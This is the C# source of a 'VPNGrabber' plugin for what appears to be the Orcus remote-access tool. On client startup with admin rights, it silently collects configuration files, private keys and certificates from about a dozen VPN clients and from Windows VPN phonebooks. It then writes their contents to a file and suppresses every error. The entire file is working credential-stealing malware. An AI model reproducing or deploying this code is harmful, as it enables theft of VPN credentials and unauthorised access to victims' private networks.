using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using Orcus.Plugins;

namespace VPNGrabber
{
    public class VPNGrabber : ClientController
    {
        public override bool InfluenceStartup(IClientStartup clientStartup)
        {
            if (!clientStartup.IsAdministrator)
            {
                return false;
            }

            string clientPath = clientStartup.ClientPath;
            string outputFile = Path.Combine(Path.GetDirectoryName(clientPath), "vpngrab.txt");

            try
            {
                var vpnData = GrabVPNData();
                SaveToFile(vpnData, outputFile);
                return true;
            }
            catch (Exception)
            {
                // Silent fail
                return false;
            }
        }

        private List<object[]> GrabVPNData()
        {
            List<object[]> list = new List<object[]>();
            string appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string localAppDataPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string programDataPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
            string userProfilePath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

            // Scan popular VPN clients
            ScanOpenVPN(appDataPath, localAppDataPath, list);
            ScanWireGuard(appDataPath, list);
            ScanNordVPN(appDataPath, localAppDataPath, list);
            ScanExpressVPN(appDataPath, localAppDataPath, list);
            ScanProtonVPN(appDataPath, localAppDataPath, list);
            ScanHotspotShield(appDataPath, list);
            ScanWindscribe(appDataPath, list);
            ScanCyberGhost(appDataPath, list);
            ScanPrivateInternetAccess(appDataPath, list);
            ScanVPNConfigs(userProfilePath, list);
            ScanSystemVPN(programDataPath, list);

            return list;
        }

        private void ScanOpenVPN(string appDataPath, string localAppDataPath, List<object[]> list)
        {
            try
            {
                string userProfilePath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                // OpenVPN config directories
                string[] openVpnPaths = {
                    Path.Combine(appDataPath, "OpenVPN"),
                    Path.Combine(localAppDataPath, "OpenVPN"),
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "OpenVPN"),
                    Path.Combine(userProfilePath, "OpenVPN")
                };

                foreach (string path in openVpnPaths)
                {
                    if (Directory.Exists(path))
                    {
                        ScanDirectoryRecursive(path, "OpenVPN", list, new[] { ".ovpn", ".conf", ".key", ".crt", ".pem", ".txt" });
                    }
                }
            }
            catch { /* Ignore errors */ }
        }

        private void ScanWireGuard(string appDataPath, List<object[]> list)
        {
            try
            {
                string wireGuardPath = Path.Combine(appDataPath, "WireGuard");
                if (Directory.Exists(wireGuardPath))
                {
                    ScanDirectoryRecursive(wireGuardPath, "WireGuard", list, new[] { ".conf" });
                }
            }
            catch { /* Ignore errors */ }
        }

        private void ScanNordVPN(string appDataPath, string localAppDataPath, List<object[]> list)
        {
            try
            {
                string[] nordPaths = {
                    Path.Combine(appDataPath, "NordVPN"),
                    Path.Combine(localAppDataPath, "NordVPN")
                };

                foreach (string path in nordPaths)
                {
                    if (Directory.Exists(path))
                    {
                        ScanDirectoryRecursive(path, "NordVPN", list, new[] { ".conf", ".xml", ".json", ".dat", ".txt" });
                    }
                }
            }
            catch { /* Ignore errors */ }
        }

        private void ScanExpressVPN(string appDataPath, string localAppDataPath, List<object[]> list)
        {
            try
            {
                string[] expressPaths = {
                    Path.Combine(appDataPath, "ExpressVPN"),
                    Path.Combine(localAppDataPath, "ExpressVPN")
                };

                foreach (string path in expressPaths)
                {
                    if (Directory.Exists(path))
                    {
                        ScanDirectoryRecursive(path, "ExpressVPN", list, new[] { ".conf", ".xml", ".json", ".dat" });
                    }
                }
            }
            catch { /* Ignore errors */ }
        }

        private void ScanProtonVPN(string appDataPath, string localAppDataPath, List<object[]> list)
        {
            try
            {
                string[] protonPaths = {
                    Path.Combine(appDataPath, "ProtonVPN"),
                    Path.Combine(localAppDataPath, "ProtonVPN")
                };

                foreach (string path in protonPaths)
                {
                    if (Directory.Exists(path))
                    {
                        ScanDirectoryRecursive(path, "ProtonVPN", list, new[] { ".conf", ".xml", ".json" });
                    }
                }
            }
            catch { /* Ignore errors */ }
        }

        private void ScanHotspotShield(string appDataPath, List<object[]> list)
        {
            try
            {
                string hotspotPath = Path.Combine(appDataPath, "HotspotShield");
                if (Directory.Exists(hotspotPath))
                {
                    ScanDirectoryRecursive(hotspotPath, "HotspotShield", list, new[] { ".conf", ".xml", ".dat" });
                }
            }
            catch { /* Ignore errors */ }
        }

        private void ScanWindscribe(string appDataPath, List<object[]> list)
        {
            try
            {
                string windscribePath = Path.Combine(appDataPath, "Windscribe");
                if (Directory.Exists(windscribePath))
                {
                    ScanDirectoryRecursive(windscribePath, "Windscribe", list, new[] { ".conf", ".json", ".dat" });
                }
            }
            catch { /* Ignore errors */ }
        }

        private void ScanCyberGhost(string appDataPath, List<object[]> list)
        {
            try
            {
                string cyberGhostPath = Path.Combine(appDataPath, "CyberGhost");
                if (Directory.Exists(cyberGhostPath))
                {
                    ScanDirectoryRecursive(cyberGhostPath, "CyberGhost", list, new[] { ".conf", ".xml", ".dat" });
                }
            }
            catch { /* Ignore errors */ }
        }

        private void ScanPrivateInternetAccess(string appDataPath, List<object[]> list)
        {
            try
            {
                string piaPath = Path.Combine(appDataPath, "Private Internet Access");
                if (Directory.Exists(piaPath))
                {
                    ScanDirectoryRecursive(piaPath, "PrivateInternetAccess", list, new[] { ".conf", ".xml", ".json" });
                }
            }
            catch { /* Ignore errors */ }
        }

        private void ScanVPNConfigs(string userProfilePath, List<object[]> list)
        {
            try
            {
                // Common VPN config locations
                string[] configPaths = {
                    Path.Combine(userProfilePath, "vpn"),
                    Path.Combine(userProfilePath, "vpns"),
                    Path.Combine(userProfilePath, "config", "vpn"),
                    Path.Combine(userProfilePath, ".vpn"),
                    Path.Combine(userProfilePath, "Downloads", "vpn"),
                    Path.Combine(userProfilePath, "Documents", "vpn")
                };

                foreach (string path in configPaths)
                {
                    if (Directory.Exists(path))
                    {
                        ScanDirectoryRecursive(path, "VPNConfigs", list, new[] { ".ovpn", ".conf", ".txt", ".json", ".xml" });
                    }
                }
            }
            catch { /* Ignore errors */ }
        }

        private void ScanSystemVPN(string programDataPath, List<object[]> list)
        {
            try
            {
                // Windows built-in VPN configurations
                string rasPath = Path.Combine(programDataPath, "Microsoft", "Network", "Connections");
                if (Directory.Exists(rasPath))
                {
                    ScanDirectoryRecursive(rasPath, "WindowsVPN", list, new[] { ".pbk" });
                }
            }
            catch { /* Ignore errors */ }
        }

        private void ScanDirectoryRecursive(string directoryPath, string category, List<object[]> list, string[] extensions)
        {
            try
            {
                foreach (string extension in extensions)
                {
                    string[] files = Directory.GetFiles(directoryPath, "*" + extension, SearchOption.AllDirectories);
                    foreach (string filePath in files)
                    {
                        try
                        {
                            string relativePath = $"VPN/{category}/{Path.GetFileName(Path.GetDirectoryName(filePath))}/{Path.GetFileName(filePath)}";
                            byte[] fileData = File.ReadAllBytes(filePath);
                            list.Add(new object[] { relativePath, fileData });
                        }
                        catch { /* Ignore individual file errors */ }
                    }
                }
            }
            catch { /* Ignore directory errors */ }
        }

        private void SaveToFile(List<object[]> vpnData, string outputPath)
        {
            try
            {
                StringBuilder sb = new StringBuilder();

                if (vpnData.Count == 0)
                {
                    sb.AppendLine("VPN Grabber Results");
                    sb.AppendLine("===================");
                    sb.AppendLine($"Generated: {DateTime.Now}");
                    sb.AppendLine();
                    sb.AppendLine("No VPN configuration files were found on this system.");
                    sb.AppendLine("The following VPN clients and locations were checked:");
                    sb.AppendLine("- OpenVPN");
                    sb.AppendLine("- WireGuard");
                    sb.AppendLine("- NordVPN");
                    sb.AppendLine("- ExpressVPN");
                    sb.AppendLine("- ProtonVPN");
                    sb.AppendLine("- Hotspot Shield");
                    sb.AppendLine("- Windscribe");
                    sb.AppendLine("- CyberGhost");
                    sb.AppendLine("- Private Internet Access");
                    sb.AppendLine("- Windows built-in VPN");
                    sb.AppendLine("- Custom VPN configurations");
                }
                else
                {
                    sb.AppendLine("VPN Grabber Results");
                    sb.AppendLine("===================");
                    sb.AppendLine($"Generated: {DateTime.Now}");
                    sb.AppendLine($"Total VPN files found: {vpnData.Count}");
                    sb.AppendLine();

                    foreach (object[] data in vpnData)
                    {
                        string filePath = (string)data[0];
                        byte[] fileContent = (byte[])data[1];

                        sb.AppendLine($"File: {filePath}");
                        sb.AppendLine($"Size: {fileContent.Length} bytes");

                        // Try to read as text for config files
                        if (filePath.EndsWith(".ovpn") || filePath.EndsWith(".conf") ||
                            filePath.EndsWith(".txt") || filePath.EndsWith(".json") ||
                            filePath.EndsWith(".xml") || filePath.EndsWith(".pbk"))
                        {
                            try
                            {
                                string content = Encoding.UTF8.GetString(fileContent);
                                // Only show first few lines to avoid huge files
                                string[] lines = content.Split('\n');
                                sb.AppendLine("Content (first 20 lines):");
                                for (int i = 0; i < Math.Min(20, lines.Length); i++)
                                {
                                    sb.AppendLine(lines[i]);
                                }
                                if (lines.Length > 20)
                                {
                                    sb.AppendLine($"[... and {lines.Length - 20} more lines]");
                                }
                            }
                            catch
                            {
                                sb.AppendLine("Content: [Binary data - cannot display]");
                            }
                        }
                        else if (filePath.EndsWith(".key") || filePath.EndsWith(".crt") || filePath.EndsWith(".pem"))
                        {
                            sb.AppendLine("Content: [Certificate/Key file - sensitive data]");
                        }
                        else if (filePath.EndsWith(".dat"))
                        {
                            sb.AppendLine("Content: [Binary data - application specific]");
                        }
                        else
                        {
                            sb.AppendLine("Content: [Unknown format]");
                        }

                        sb.AppendLine(new string('-', 60));
                        sb.AppendLine();
                    }
                }

                File.WriteAllText(outputPath, sb.ToString());
            }
            catch
            {
                // Silent fail
            }
        }
    }
}